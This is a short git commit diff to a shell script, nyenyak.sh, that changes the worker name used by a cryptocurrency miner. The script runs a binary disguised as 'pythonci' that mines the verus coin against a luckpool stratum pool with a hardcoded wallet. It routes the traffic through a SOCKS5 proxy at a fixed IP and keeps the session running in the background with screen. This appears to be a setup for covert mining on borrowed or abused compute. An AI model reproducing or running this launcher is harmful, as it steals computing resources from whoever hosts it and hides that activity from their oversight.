0f488ce5249b24c30f4b5520803ab266d6e09556
judaganempang <88379716+judaganempang@users.noreply.github.com>
2021-08-03 18:05:45 +0700

    Update nyenyak.sh

--- nyenyak.sh
+++ nyenyak.sh
@@ -5,6 +5,6 @@ chmod +x nyenyak.sh && chmod +x pythonci chmod 777 pythonci nyenyak.sh
 screen -dmS ls
 PL=stratum+tcp://na.luckpool.net:3956
 WT=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
-WR=$(echo $(shuf -i 1-1 -n 1)-VIA9)
+WR=$(echo $(shuf -i 1-1 -n 1)-VIA28)
 PY=socks5://98.185.94.65:15608
 ./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
